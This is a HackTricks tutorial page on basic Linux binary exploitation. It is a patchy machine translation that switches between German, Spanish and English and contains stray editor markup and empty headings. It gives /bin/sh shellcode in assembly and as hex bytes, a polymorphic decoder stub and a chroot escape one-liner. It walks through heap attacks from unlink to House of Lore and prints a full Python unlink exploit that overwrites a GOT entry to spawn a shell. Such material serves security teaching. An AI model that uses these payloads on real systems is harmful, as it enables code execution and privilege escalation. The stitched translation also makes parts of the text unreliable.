# Linux Exploiting (Basic) (SPA)

<details>

<summary><strong>Erlernen Sie AWS-Hacking von Grund auf mit</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Andere M√∂glichkeiten, HackTricks zu unterst√ºtzen:

* Wenn Sie Ihr **Unternehmen in HackTricks beworben sehen m√∂chten** oder **HackTricks im PDF-Format herunterladen m√∂chten**, √ºberpr√ºfen Sie die [**ABONNEMENTPL√ÑNE**](https://github.com/sponsors/carlospolop)!
* Holen Sie sich das [**offizielle PEASS & HackTricks-Merch**](https://peass.creator-spring.com)
* Entdecken Sie [**The PEASS Family**](https://opensea.io/collection/the-peass-family), unsere Sammlung exklusiver [**NFTs**](https://opensea.io/collection/the-peass-family)
* **Treten Sie der** üí¨ [**Discord-Gruppe**](https://discord.gg/hRep4RUj7f) oder der [**Telegram-Gruppe**](https://t.me/peass) bei oder **folgen** Sie uns auf **Twitter** üê¶ [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Teilen Sie Ihre Hacking-Tricks, indem Sie PRs an die** [**HackTricks**](https://github.com/carlospolop/hacktricks) und [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) GitHub-Repositories senden.

</details>

## **2.SHELLCODE**

Siehe Kernel-Unterbrechungen: cat /usr/include/i386-linux-gnu/asm/unistd\_32.h | grep ‚Äú\_\_NR\_‚Äù

setreuid(0,0); // \_\_NR\_setreuid 70\
execve(‚Äú/bin/sh‚Äù, args\[], NULL); // \_\_NR\_execve 11\
exit(0); // \_\_NR\_exit 1

xor eax, eax ; l√∂schen von eax\
xor ebx, ebx ; ebx = 0 da kein Argument √ºbergeben wird\
mov al, 0x01 ; eax = 1 ‚Äî> \_\_NR\_exit 1\
int 0x80 ; Syscall ausf√ºhren

**nasm -f elf assembly.asm** ‚Äî> Gibt uns eine .o-Datei zur√ºck\
**ld assembly.o -o shellcodeout** ‚Äî> Erzeugt eine ausf√ºhrbare Datei aus dem Assemblercode, aus der wir die Opcodes mit **objdump** extrahieren k√∂nnen\
**objdump -d -Mintel ./shellcodeout** ‚Äî> Um sicherzustellen, dass es sich tats√§chlich um unseren Shellcode handelt und um die Opcodes zu extrahieren

**√úberpr√ºfen Sie, ob der Shellcode funktioniert**
```
char shellcode[] = ‚Äú\x31\xc0\x31\xdb\xb0\x01\xcd\x80‚Äù

void main(){
void (*fp) (void);
fp = (void *)shellcode;
fp();
}<span id="mce_marker" data-mce-type="bookmark" data-mce-fragment="1">‚Äã</span>
```
Para confirmar, dass Systemaufrufe korrekt ausgef√ºhrt werden, muss das vorherige Programm kompiliert werden und die Systemaufrufe sollten in **strace ./KOMPILIERTE\_PROGRAMM** erscheinen.

Beim Erstellen von Shellcodes kann ein Trick angewendet werden. Die erste Anweisung ist ein Sprung zu einem Aufruf. Der Aufruf ruft den Originalcode auf und legt zus√§tzlich das EIP im Stack ab. Nach dem Aufruf haben wir den ben√∂tigten String platziert, sodass wir mit diesem EIP auf den String zeigen und gleichzeitig den Code weiter ausf√ºhren k√∂nnen.

BEISPIEL **TRICK (/bin/sh)**:
```
jmp                 0x1f                                        ; Salto al √∫ltimo call
popl                %esi                                       ; Guardamos en ese la direcci√≥n al string
movl               %esi, 0x8(%esi)       ; Concatenar dos veces el string (en este caso /bin/sh)
xorl                 %eax, %eax             ; eax = NULL
movb  %eax, 0x7(%esi)     ; Ponemos un NULL al final del primer /bin/sh
movl               %eax, 0xc(%esi)      ; Ponemos un NULL al final del segundo /bin/sh
movl   $0xb, %eax               ; Syscall 11
movl               %esi, %ebx               ; arg1=‚Äú/bin/sh‚Äù
leal                 0x8(%esi), %ecx      ; arg[2] = {‚Äú/bin/sh‚Äù, ‚Äú0‚Äù}
leal                 0xc(%esi), %edx      ; arg3 = NULL
int                    $0x80                         ; excve(‚Äú/bin/sh‚Äù, [‚Äú/bin/sh‚Äù, NULL], NULL)
xorl                 %ebx, %ebx             ; ebx = NULL
movl   %ebx, %eax
inc                   %eax                          ; Syscall 1
int                    $0x80                         ; exit(0)
call                  -0x24                          ; Salto a la primera instruci√≥n
.string             \‚Äù/bin/sh\‚Äù                               ; String a usar<span id="mce_marker" data-mce-type="bookmark" data-mce-fragment="1">‚Äã</span>
```
**EJ using Stack(/bin/sh):**
```
section .text
global _start
_start:
xor                  eax, eax                     ;Limpieza
mov                al, 0x46                      ; Syscall 70
xor                  ebx, ebx                     ; arg1 = 0
xor                  ecx, ecx                     ; arg2 = 0
int                    0x80                           ; setreuid(0,0)
xor                  eax, eax                     ; eax = 0
push   eax                             ; ‚Äú\0‚Äù
push               dword 0x68732f2f ; ‚Äú//sh‚Äù
push               dword 0x6e69622f; ‚Äú/bin‚Äù
mov                ebx, esp                     ; arg1 = ‚Äú/bin//sh\0‚Äù
push               eax                             ; Null -> args[1]
push               ebx                             ; ‚Äú/bin/sh\0‚Äù -> args[0]
mov                ecx, esp                     ; arg2 = args[]
mov                al, 0x0b                      ; Syscall 11
int                    0x80                           ; excve(‚Äú/bin/sh‚Äù, args[‚Äú/bin/sh‚Äù, ‚ÄúNULL‚Äù], NULL)
```
**EJ FNSTENV:**
```
fabs
fnstenv [esp-0x0c]
pop eax                     ; Guarda el EIP en el que se ejecut√≥ fabs
‚Ä¶
```
**Egg Hunter:**

Besteht aus einem kleinen Code, der die Speicherseiten eines Prozesses nach der dort gespeicherten Shellcode durchsucht (sucht nach einer Signatur im Shellcode). N√ºtzlich in F√§llen, in denen nur wenig Platz zum Einspritzen von Code zur Verf√ºgung steht.

**Polymorphe Shellcodes**

Es handelt sich um verschl√ºsselte Shells, die √ºber kleine Codes verf√ºgen, die sie entschl√ºsseln und zu ihnen springen lassen, unter Verwendung des Call-Pop-Tricks w√§re dies ein **Beispiel f√ºr eine Caesar-Verschl√ºsselung**:
```
global _start
_start:
jmp short magic
init:
pop     esi
xor      ecx, ecx
mov    cl,0                              ; Hay que sustituir el 0 por la longitud del shellcode (es lo que recorrer√°)
desc:
sub     byte[esi + ecx -1], 0 ; Hay que sustituir el 0 por la cantidad de bytes a restar (cifrado cesar)
sub     cl, 1
jnz       desc
jmp     short sc
magic:
call init
sc:
;Aqu√≠ va el shellcode
```
## **5. Zus√§tzliche Methoden**





**Murat-Technik**

In Linux werden alle Programme ab 0xbfffffff gemappt.

Durch die Analyse des Aufbaus des Stacks eines neuen Prozesses in Linux kann ein Exploit entwickelt werden, bei dem das Programm in einer Umgebung gestartet wird, in der nur die Shellcode-Variable vorhanden ist. Die Adresse dieser Variable kann dann wie folgt berechnet werden: addr = 0xbfffffff - 4 - strlen(VOLLST√ÑNDIGER_AUSF√úHRBARER_NAME) - strlen(shellcode)

Auf diese Weise kann einfach die Adresse ermittelt werden, an der sich die Umgebungsvariable mit dem Shellcode befindet.

Dies ist m√∂glich, da die Funktion execle eine Umgebung erstellen kann, die nur die gew√ºnschten Umgebungsvariablen enth√§lt.



##

###

###

###

###

### **Format Strings to Buffer Overflows**

Das **sprintf** bewegt einen formatierten String in eine Variable. Daher k√∂nnte man die Formatierung eines Strings missbrauchen, um einen Puffer√ºberlauf in der Variablen zu verursachen, in die der Inhalt kopiert wird.\
Beispielsweise schreibt das Payload `%.44xAAAA` 44B+"AAAA" in die Variable, was einen Puffer√ºberlauf verursachen kann.

### **\_\_atexit-Strukturen**

{% hint style="danger" %}
Heutzutage ist es sehr ungew√∂hnlich, dies auszunutzen.
{% endhint %}

**`atexit()`** ist eine Funktion, der andere Funktionen als Parameter √ºbergeben werden. Diese Funktionen werden ausgef√ºhrt, wenn ein **`exit()`** ausgef√ºhrt wird oder das **main** beendet wird.\
Wenn Sie die Adresse einer dieser Funktionen so √§ndern k√∂nnen, dass sie beispielsweise auf einen Shellcode zeigt, k√∂nnen Sie die Kontrolle √ºber den Prozess √ºbernehmen. Dies ist jedoch derzeit komplizierter.\
Derzeit sind die Adressen der auszuf√ºhrenden Funktionen hinter mehreren Strukturen versteckt, und schlie√ülich sind die Adressen, auf die sie zeigen, nicht die Adressen der Funktionen, sondern sind mit XOR verschl√ºsselt und Verschiebungen mit einem zuf√§lligen Schl√ºssel. Daher ist dieser Angriffsvektor derzeit auf x86 und x64\_86 nicht sehr n√ºtzlich.\
Die Verschl√ºsselungsfunktion ist **`PTR_MANGLE`**. **Andere Architekturen** wie m68k, mips32, mips64, aarch64, arm, hppa... **implementieren die Verschl√ºsselungsfunktion nicht**, da sie das Gleiche zur√ºckgeben wie sie als Eingabe erhalten haben. Daher w√§ren diese Architekturen √ºber diesen Vektor angreifbar.

### **setjmp() & longjmp()**

{% hint style="danger" %}
Heutzutage ist es sehr ungew√∂hnlich, dies auszunutzen.
{% endhint %}

**`Setjmp()`** erm√∂glicht das **Speichern** des Kontexts (der Register)\
**`longjmp()`** erm√∂glicht das **Wiederherstellen** des Kontexts.\
Die gespeicherten Register sind: `EBX, ESI, EDI, ESP, EIP, EBP`\
Das Problem ist, dass EIP und ESP durch die Funktion **`PTR_MANGLE`** √ºbergeben werden, sodass die **Architektur, die anf√§llig f√ºr diesen Angriff ist, die gleiche ist wie oben**.\
Sie sind n√ºtzlich f√ºr Fehlerbehebung oder Unterbrechungen.\
Jedoch sind nach meinen Recherchen die anderen Register nicht gesch√ºtzt, **so dass bei einem `call ebx`, `call esi` oder `call edi`** innerhalb der aufgerufenen Funktion die Kontrolle √ºbernommen werden kann. Oder Sie k√∂nnten auch EBP √§ndern, um ESP zu √§ndern.

**VTable und VPTR in C++**

Jede Klasse hat eine **Vtable**, die ein Array von **Zeigern auf Methoden** ist.

Jedes Objekt einer **Klasse** hat einen **VPtr**, der ein **Zeiger** auf das Array seiner Klasse ist. Der VPtr ist Teil des Headers jedes Objekts, sodass bei einer **√úberschreibung** des **VPtr** dieser ge√§ndert werden k√∂nnte, um auf eine Dummy-Methode zu zeigen, sodass beim Ausf√ºhren einer Funktion der Shellcode aufgerufen wird.

## **Pr√§ventivma√ünahmen und Umgehungen**

###

**Ersetzen von Libsafe**

Aktivieren mit: LD\_PRELOAD=/lib/libsafe.so.2\
oder\
‚Äú/lib/libsave.so.2‚Äù > /etc/ld.so.preload

Einige unsichere Funktionen werden durch sichere Funktionen abgefangen. Nicht standardisiert. (nur f√ºr x86, nicht f√ºr Kompilierungen mit -fomit-frame-pointer, nicht f√ºr statische Kompilierungen, nicht alle anf√§lligen Funktionen werden sicher gemacht und LD\_PRELOAD funktioniert nicht bei SUID-Bin√§rdateien).

**ASCII Armored Address Space**

Es beinhaltet das Laden von Shared Libraries von 0x00000000 bis 0x00ffffff, damit immer ein Byte 0x00 vorhanden ist. Dies h√§lt jedoch kaum einen Angriff auf, insbesondere nicht in Little Endian.

**ret2plt**

Es besteht darin, ein ROP durchzuf√ºhren, bei dem die Funktion strcpy@plt (aus der plt) aufgerufen wird und auf den Eintrag in der GOT gezeigt wird, und das erste Byte der zu aufrufenden Funktion (system()) kopiert wird. Anschlie√üend wird dasselbe f√ºr GOT+1 durchgef√ºhrt und das 2. Byte von system() kopiert... Schlie√ülich wird die in der GOT gespeicherte Adresse aufgerufen, die system() sein wird.

**Chroot-K√§fige**

debootstrap -arch=i386 hardy /home/user ‚Äî> Installiert ein grundlegendes System unter einem bestimmten Unterverzeichnis

Ein Administrator kann aus einem dieser K√§fige ausbrechen, indem er: mkdir foo; chroot foo; cd ..

**Code-Instrumentierung**

Valgrind ‚Äî> Sucht nach Fehlern\
Memcheck\
RAD (Return Address Defender)\
Insure++

## **8 Heap Overflows: Grundlegende Exploits**

**Zugewiesenes St√ºck**

prev\_size |\
size | ‚ÄîHeader\
\*mem | Daten

**Freies St√ºck**

prev\_size |\
size |\
\*fd | Ptr vorw√§rts Chunk\
\*bk | Ptr r√ºckw√§rts Chunk ‚ÄîHeader\
\*mem | Daten

Die freien St√ºcke sind in einer doppelt verketteten Liste (bin) und es d√ºrfen niemals zwei freie St√ºcke nebeneinander sein (sie werden zusammengef√ºhrt).

Im "size"-Feld gibt es Bits, um anzuzeigen: ob das vorherige St√ºck verwendet wird, ob das St√ºck √ºber mmap() zugewiesen wurde und ob das St√ºck zum prim√§ren Arena geh√∂rt.

Wenn ein St√ºck freigegeben wird und eines der benachbarten St√ºcke frei ist, werden diese durch die Makro unlink() fusioniert und das gr√∂√üere neue St√ºck wird frontlink() √ºbergeben, um es in den entsprechenden Bin einzuf√ºgen.

unlink(){\
BK = P->bk; ‚Äî> Der BK des neuen Chunks ist der, den das zuvor freie St√ºck hatte\
FD = P->fd; ‚Äî> Der FD des neuen Chunks ist der, den das zuvor freie St√ºck hatte\
FD->bk = BK; ‚Äî> Der BK des n√§chsten Chunks zeigt auf den neuen Chunk\
BK->fd = FD; ‚Äî> Der FD des vorherigen Chunks zeigt auf den neuen Chunk\
}

Daher, wenn es gelingt, P->bk mit der Adresse eines Shellcodes und P->fd mit der Adresse eines Eintrags in der GOT oder DTORS minus 12 zu √§ndern, wird erreicht:

BK = P->bk = \&shellcode\
FD = P->fd = &\_\_dtor\_end\_\_ - 12\
FD->bk = BK -> \*((&\_\_dtor\_end\_\_ - 12) + 12) = \&shellcode

Dadurch wird der Shellcode beim Verlassen des Programms ausgef√ºhrt.

Au√üerdem schreibt der 4. Satz von unlink() etwas, und der Shellcode muss daf√ºr angepasst werden:

BK->fd = FD -> \*(\&shellcode + 8) = (&\_\_dtor\_end\_\_ - 12) ‚Äî> Dies f√ºhrt dazu, dass 4 Bytes ab dem 8. Byte des Shellcodes geschrieben werden, sodass die erste Anweisung des Shellcodes ein Sprung sein muss, um dies zu √ºberspringen und zu den Nops zu gelangen, die den Rest des Shellcodes ausf√ºhren.

Daher wird der Exploit erstellt:

In den Puffer1 wird der Shellcode eingef√ºgt, beginnend mit einem Sprung, damit er zu den Nops oder dem Rest des Shellcodes gelangt.

Nach dem Shellcode wird F√ºllmaterial eingef√ºgt, bis die Felder prev\_size und size des n√§chsten St√ºcks erreicht sind. An diesen Stellen werden 0xfffffff0 (um prev\_size zu √ºberschreiben, damit das Bit angezeigt wird, dass es frei ist) und "-4" (0xfffffffc) in die size eingef√ºgt (damit, wenn im 3. St√ºck √ºberpr√ºft wird, ob das 2. St√ºck frei war, tats√§chlich auf die modifizierte prev\_size verwiesen wird, die angibt, dass es frei ist) -> Wenn also free() √ºberpr√ºft, wird es zur size des 3. St√ºcks gehen, aber tats√§chlich zum 2. - 4 und denken, dass das 2. St√ºck frei ist. Dann wird **unlink()** aufgerufen.
Al llamar a unlink() se usar√° P->fd los primeros datos del 2¬∫ trozo por lo que ah√≠ se meter√° la direcci√≥n que se quieres sobreescribir - 12(pues en FD->bk le sumar√° 12 a la direcci√≥n guardada en FD) . Y en esa direcci√≥n introducir√° la segunda direcci√≥n que encuentre en el 2¬∫ trozo, que nos interesar√° que sea la direcci√≥n a la shellcode(P->bk falso).

**from struct import \***

**import os**

**shellcode = "\xeb\x0caaaabbbbcccc" #jm 12 + 12bytes de relleno**

**shellcode += "\xeb\x1f\x5e\x89\x76\x08\x31\xc0\x88\x46\x07\x89\x46\x0c\xb0\x0b" \\**

**"\x89\xf3\x8d\x4e\x08\x8d\x56\x0c\xcd\x80\x31\xdb\x89\xd8\x40\xcd" \\**

**"\x80\xe8\xdc\xff\xff\xff/bin/sh";**

**prev\_size = pack("\<I‚Äù, 0xfffffff0) #Interesa que el bit que indica que el anterior trozo est√° libre est√© a 1**

**fake\_size = pack("\<I‚Äù, 0xfffffffc) #-4, para que piense que el ‚Äúsize‚Äù del 3¬∫ trozo est√° 4bytes detr√°s (apunta a prev\_size) pues es ah√≠ donde mira si el 2¬∫ trozo est√° libre**

**addr\_sc = pack("\<I", 0x0804a008 + 8) #En el payload al principio le vamos a poner 8bytes de relleno**

**got\_free = pack("\<I", 0x08048300 - 12) #Direcci√≥n de free() en la plt-12 (ser√° la direcci√≥n que se sobrescrita para que se lanza la shellcode la 2¬∫ vez que se llame a free)**

**payload = "aaaabbbb" + shellcode + "b"\*(512-len(shellcode)-8) # Como se dijo el payload comienza con 8 bytes de relleno porque s√≠**

**payload += prev\_size + fake\_size + got\_free + addr\_sc #Se modifica el 2¬∫ trozo, el got\_free apunta a donde vamos a guardar la direccion addr\_sc + 12**

**os.system("./8.3.o " + payload)**

**unset() liberando en sentido inverso (wargame)**

Estamos controlando 3 chunks consecutivos y se liberan en orden inverso al reservado.

En ese caso:

En el chunck c se pone el shellcode

El chunck a lo usamos para sobreescribir el b de forma que el el size tenga el bit PREV\_INUSE desactivado de forma que piense que el chunck a est√° libre.

Adem√°s, se sobreescribe en la cabecera b el size para que valga -4.

Entonces, el programa se pensar√° que ‚Äúa‚Äù est√° libre y en un bin, por lo que llamar√° a unlink() para desenlazarlo. Sin embargo, como la cabecera PREV\_SIZE vale -4. Se pensar√° que el trozo de ‚Äúa‚Äù realmente empieza en b+4. Es decir, har√° un unlink() a un trozo que comienza en b+4, por lo que en b+12 estar√° el puntero ‚Äúfd‚Äù y en b+16 estar√° el puntero ‚Äúbk‚Äù.

De esta forma, si en bk ponemos la direcci√≥n a la shellcode y en fd ponemos la direcci√≥n a la funci√≥n ‚Äúputs()‚Äù-12 tenemos nuestro payload.

**T√©cnica de Frontlink**

Se llama a frontlink cuando se libera algo y ninguno de sus trozos contiguos no son libres, no se llama a unlink() sino que se llama directamente a frontlink().

Vulnerabilidad √∫til cuando el malloc que se ataca nunca es liberado (free()).

Necesita:

Un buffer que pueda desbordarse con la funci√≥n de entrada de datos

Un buffer contiguo a este que debe ser liberado y al que se le modificar√° el campo fd de su cabecera gracias al desbordamiento del buffer anterior

Un buffer a liberar con un tama√±o mayor a 512 pero menor que el buffer anterior

Un buffer declarado antes del paso 3 que permita sobreescribir el prev\_size de este

De esta forma logrando sobres cribar en dos mallocs de forma descontrolada y en uno de forma controlada pero que solo se libera ese uno, podemos hacer un exploit.

**Vulnerabilidad double free()**

Si se llama dos veces a free() con el mismo puntero, quedan dos bins apuntando a la misma direcci√≥n.

En caso de querer volver a usar uno se asignar√≠a sin problemas. En caso de querer usar otro, se le asignar√≠a el mismo espacio por lo que tendr√≠amos los punteros ‚Äúfd‚Äù y ‚Äúbk‚Äù falseados con los datos que escribir√° la reserva anterior.

**After free()**

Un puntero previamente liberado es usado de nuevo sin control.

## **8 Heap Overflows: Exploits avanzados**

Las t√©cnicas de Unlink() y FrontLink() fueron eliminadas al modificar la funci√≥n unlink().

**The house of mind**

Solo una llamada a free() es necesaria para provocar la ejecuci√≥n de c√≥digo arbitrario. Interesa buscar un segundo trozo que puede ser desbordado por uno anterior y liberado.

Una llamada a free() provoca llamar a public\_fREe(mem), este hace:

mstate ar\_ptr;

mchunkptr p;

‚Ä¶

p = mem2chunk(mes); ‚Äî> Devuelve un puntero a la direcci√≥n donde comienza el trozo (mem-8)

‚Ä¶

ar\_ptr = arena\_for\_chunk(p); ‚Äî> chunk\_non\_main\_arena(ptr)?heap\_for\_ptr(ptr)->ar\_ptr:\&main\_arena \[1]

‚Ä¶

\_int\_free(ar\_ptr, mem);

}

En \[1] comprueba el campo size el bit NON\_MAIN\_ARENA, el cual se puede alterar para que la comprobaci√≥n devuelva true y ejecute heap\_for\_ptr() que hace un and a ‚Äúmem‚Äù dejando a 0 los 2.5 bytes menos importantes (en nuestro caso de 0x0804a000 deja 0x08000000) y accede a 0x08000000->ar\_ptr (como si fuese un struct heap\_info)

De esta forma si podemos controlar un trozo por ejemplo en 0x0804a000 y se va a liberar un trozo en **0x081002a0** podemos llegar a la direcci√≥n 0x08100000 y escribir lo que queramos, por ejemplo **0x0804a000**. Cuando este segundo trozo se libere se encontrar√° que heap\_for\_ptr(ptr)->ar\_ptr devuelve lo que hemos escrito en 0x08100000 (pues se aplica a 0x081002a0 el and que vimos antes y de ah√≠ se saca el valor de los 4 primeros bytes, el ar\_ptr)

De esta forma se llama a \_int\_free(ar\_ptr, mem), es decir, **\_int\_free(0x0804a000, 0x081002a0)**\
**\_int\_free(mstate av, Void\_t\* mem){**\
‚Ä¶\
bck = unsorted\_chunks(av);\
fwd = bck->fd;\
p->bk = bck;\
p->fd = fwd;\
bck->fd = p;\
fwd->bk = p;

..}

Como hemos visto antes podemos controlar el valor de av, pues es lo que escribimos en el trozo que se va a liberar.

Tal y como se define unsorted\_chunks, sabemos que:\
bck = \&av->bins\[2]-8;\
fwd = bck->fd = \*(av->bins\[2]);\
fwd->bk = \*(av->bins\[2] + 12) = p;

Por lo tanto si en av->bins\[2] escribimos el valor de \_\_DTOR\_END\_\_-12 en la √∫ltima instrucci√≥n se escribir√° en \_\_DTOR\_END\_\_ la direcci√≥n del segundo trozo.

Es decir, en el primer trozo tenemos que poner al inicio muchas veces la direcci√≥n de \_\_DTOR\_END\_\_-12 porque de ah√≠ la sacar√° av->bins\[2]

En la direcci√≥n que caiga la direcci√≥n del segundo trozo con los √∫ltimos 5 ceros hay que escribir la direcci√≥n a este primer trozo para que heap\_for\_ptr() piense que el ar\_ptr est√° al inicio del primer trozo y saque de ah√≠ el av->bins\[2]
En the second chunk and thanks to the first one we overwrite the prev\_size with a jump 0x0c and the size with something to trigger -> NON\_MAIN\_ARENA

Next in chunk 2 we put a lot of nops and finally the shellcode

This way \_int\_free(CHUNK1, CHUNK2) will be called and will follow the instructions to write in \_\_DTOR\_END\_\_ the address of the prev\_size of CHUNK2 which will jump to the shellcode.

To apply this technique, some additional requirements need to be met which complicate the payload a bit more.

This technique is no longer applicable as almost the same patch as for unlink was applied. It compares if the new site being pointed to is also pointing back to it.

**Fastbin**

It is a variant of The house of mind

we are interested in executing the following code which is reached after the first check in the \_int\_free() function

fb = &(av->fastbins\[fastbin\_index(size)] ‚Äî> Being fastbin\_index(sz) ‚Äî> (sz >> 3) - 2

‚Ä¶

p->fd = \*fb

\*fb = p

This way, if we put in "fb" the address of a function in the GOT, the address to the overwritten chunk will be placed at this address. For this, it will be necessary for the arena to be close to the dtors addresses. More precisely, av->max\_fast must be at the address we are going to overwrite.

Since with The House of Mind it was seen that we controlled the position of av.

So if we put a size of 8 + NON\_MAIN\_ARENA + PREV\_INUSE in the size field -> fastbin\_index() will return fastbins\[-1\], which will point to av->max\_fast

In this case, av->max\_fast will be the address that is overwritten (not the one it points to, but that position will be overwritten).

It must also be ensured that the contiguous chunk to the freed one must be larger than 8 -> Since we have said that the size of the freed chunk is 8, in this fake chunk we only have to put a size larger than 8 (also, since the shellcode will be in the freed chunk, we will have to put a jump at the beginning that falls into nops).

Additionally, this same fake chunk must be smaller than av->system\_mem. av->system\_mem is located 1848 bytes beyond.

Due to the nulls in \_DTOR\_END\_ and the few addresses in the GOT, none of these addresses are suitable to be overwritten, so let's see how to apply fastbin to attack the stack.

Another form of attack is redirecting the **av** to the stack.

If we modify the size to be 16 instead of 8 then: fastbin\_index() will return fastbins\[0\] and we can use this to overwrite the stack.

For this, there should be no canary or weird values on the stack, in fact, we have to find ourselves in this: 4 null bytes + EBP + RET

The 4 null bytes are needed so that the **av** will be at this address and the first element of an **av** is the mutex that must be 0.

The **av->max\_fast** will be the EBP and will be a value that will help us bypass the restrictions.

In **av->fastbins\[0\]** will be overwritten with the address of **p** and it will be the RET, so it will jump to the shellcode.

Also, in **av->system\_mem** (1484 bytes above the stack position) there will be enough garbage that will allow us to bypass the check that is performed.

It must also be ensured that the contiguous chunk to the freed one must be larger than 8 -> Since we have said that the size of the freed chunk is 16, in this fake chunk we only have to put a size larger than 8 (also, since the shellcode will be in the freed chunk, we will have to put a jump at the beginning that falls into nops that come after the size field of the new fake chunk).

**The House of Spirit**

In this case, we seek to have a pointer to a malloc that can be altered by the attacker (for example, the pointer is on the stack below a possible overflow to a variable).

Thus, we could make this pointer point wherever. However, not any location is valid, the size of the faked chunk must be smaller than av->max\_fast and more specifically equal to the size requested in a future call to malloc()+8. Therefore, if we know that after this vulnerable pointer a malloc(40) is called, the size of the fake chunk must be equal to 48.

For example, if the program asks the user for a number, we could enter 48 and point the modifiable malloc pointer to the next 4 bytes (which could belong to the EBP with luck, so the 48 remains behind, as if it were the size header). Additionally, the address ptr-4+48 must meet several conditions (in this case ptr=EBP), that is, 8 < ptr-4+48 < av->system\_mem.

If this is met, when the next malloc call that we said was malloc(40) is made, the address assigned to it will be the address of the EBP. In case the attacker can also control what is written in this malloc, they can overwrite both the EBP and the EIP with the desired address.

I think this is because when it is freed free() will save that at the address pointing to the EBP of the stack there is a chunk of perfect size for the new malloc() that is wanted to reserve, so it assigns that address.

**The House of Force**

It is necessary:

* An overflow to a chunk that allows overwriting the wilderness
* A call to malloc() with the size defined by the user
* A call to malloc() whose data can be defined by the user

The first thing to do is to overwrite the size of the wilderness chunk with a very large value (0xffffffff), so any sufficiently large memory request will be handled in \_int\_malloc() without the need to expand the heap.

The second step is to alter av->top to point to a memory area under the attacker's control, such as the stack. In av->top, \&EIP - 8 will be placed.

We have to overwrite av->top to point to the memory area under the attacker's control:

victim = av->top;

remainder = chunck\_at\_offset(victim, nb);

av->top = remainder;

Victim collects the value of the current wilderness chunk address (the current av->top) and remainder is exactly the sum of that address plus the number of bytes requested by malloc(). So if \&EIP-8 is at 0xbffff224 and av->top contains 0x080c2788, then the amount we have to reserve in the controlled malloc for av->top to point to $EIP-8 for the next malloc() will be:

0xbffff224 - 0x080c2788 = 3086207644.

This way the altered value will be saved in av->top and the next malloc will point to the EIP and it can be overwritten.

It is important to know that the size of the new wilderness chunk is larger than the request made by the last malloc(). That is, if the wilderness is pointing to \&EIP-8, the size will be right in the EBP field of the stack.

**The House of Lore**

**SmallBin Corruption**

The freed chunks are placed in the bin based on their size. But before being placed, they are stored in unsorted bins. When a chunk is freed, it is not immediately placed in its bin but remains in unsorted bins. Then, if a new chunk is requested and the previously freed one can be used, it is returned, but if a larger one is requested, the freed chunk in unsorted bins is placed in its appropriate bin.

To reach the vulnerable code, the memory request must be greater than av->max\_fast (usually 72) and less than MIN\_LARGE\_SIZE (512).
Si in den Bins ein St√ºck mit der richtigen Gr√∂√üe f√ºr die Anforderungen vorhanden ist, wird dieses nach dem Entkoppeln zur√ºckgegeben:

bck = victim->bk; Zeigt auf das vorherige St√ºck, dies ist die einzige Information, die wir √§ndern k√∂nnen.

bin->bk = bck; Das vorletzte St√ºck wird zum letzten, falls bck auf den Stack zum n√§chsten reservierten St√ºck zeigt, wird ihm diese Adresse gegeben.

bck->fd = bin; Die Liste wird geschlossen, indem sie auf bin zeigt.

Erforderlich sind:

Zwei malloc-Reservierungen, sodass nach der Freigabe des zweiten ein √úberlauf im ersten erfolgen kann (d. h. ein gr√∂√üeres malloc als das zweite St√ºck reserviert wurde, bevor der √úberlauf erfolgt)

Der vom Angreifer gew√§hlte malloc-Speicher muss vom Angreifer kontrolliert werden.

Das Ziel ist folgendes: Wenn wir einen Heap-√úberlauf auf einem Heap durchf√ºhren k√∂nnen, der ein bereits freigegebenes St√ºck unter sich hat und in seinem Bin liegt, k√∂nnen wir seinen bk-Pointer √§ndern. Wenn wir seinen bk-Pointer √§ndern und dieses St√ºck das erste in der Bin-Liste wird und reserviert wird, wird der Bin get√§uscht und ihm wird gesagt, dass das letzte St√ºck in der Liste (das n√§chste Angebot) an der falschen Adresse liegt, die wir angegeben haben (zum Beispiel auf den Stack oder GOT). Wenn also ein weiteres St√ºck reserviert wird und der Angreifer Berechtigungen daf√ºr hat, wird ihm ein St√ºck an der gew√ºnschten Position gegeben und er kann darauf schreiben.

Nachdem das modifizierte St√ºck freigegeben wurde, muss ein gr√∂√üeres St√ºck als das freigegebene reserviert werden, damit das modifizierte St√ºck aus den unsortierten Bins entfernt und in sein Bin eingef√ºgt wird.

Sobald es in seinem Bin ist, ist es an der Zeit, seinen bk-Pointer durch den √úberlauf so zu √§ndern, dass er auf die gew√ºnschte Adresse zeigt.

Der Bin muss warten, bis malloc() ausreichend oft aufgerufen wird, damit der modifizierte Bin erneut verwendet wird und den Bin dazu bringt zu glauben, dass das n√§chste St√ºck an der falschen Adresse liegt. Anschlie√üend wird das gew√ºnschte St√ºck gegeben.

Um die Schwachstelle so schnell wie m√∂glich auszunutzen, w√§re ideal: Reservierung des anf√§lligen St√ºcks, Reservierung des zu modifizierenden St√ºcks, Freigabe dieses St√ºcks, Reservierung eines gr√∂√üeren St√ºcks als das zu modifizierende, Modifizierung des St√ºcks (Schwachstelle), Reservierung eines St√ºcks gleicher Gr√∂√üe wie das verwundbare und Reservierung eines zweiten St√ºcks gleicher Gr√∂√üe, das auf die gew√§hlte Adresse zeigt.

Zum Schutz vor diesem Angriff wird die typische √úberpr√ºfung verwendet, dass das St√ºck "nicht" falsch ist: Es wird √ºberpr√ºft, ob bck->fd auf victim zeigt. Das hei√üt, in unserem Fall, ob der fd-Pointer des falschen St√ºcks, das auf dem Stack zeigt, auf victim zeigt. Um diesen Schutz zu umgehen, m√ºsste der Angreifer auf irgendeine Weise (wahrscheinlich √ºber den Stack) in der Lage sein, die Adresse von victim an die richtige Adresse zu schreiben. Damit es wie ein echtes St√ºck aussieht.

**Korruption LargeBin**

Die gleichen Anforderungen wie zuvor sind erforderlich und einige mehr, au√üerdem m√ºssen die reservierten St√ºcke gr√∂√üer als 512 sein.

Der Angriff ist wie zuvor, das hei√üt, der bk-Pointer muss ge√§ndert werden und all diese malloc()-Aufrufe sind erforderlich, aber zus√§tzlich muss die Gr√∂√üe des modifizierten St√ºcks so ge√§ndert werden, dass size - nb < MINSIZE ist.

Zum Beispiel muss die Gr√∂√üe auf 1552 gesetzt werden, damit 1552 - 1544 = 8 < MINSIZE (die Subtraktion kann nicht negativ sein, da ein unsigned-Wert verglichen wird)

Au√üerdem wurde ein Patch eingef√ºhrt, um es noch komplizierter zu machen.

**Heap Spraying**

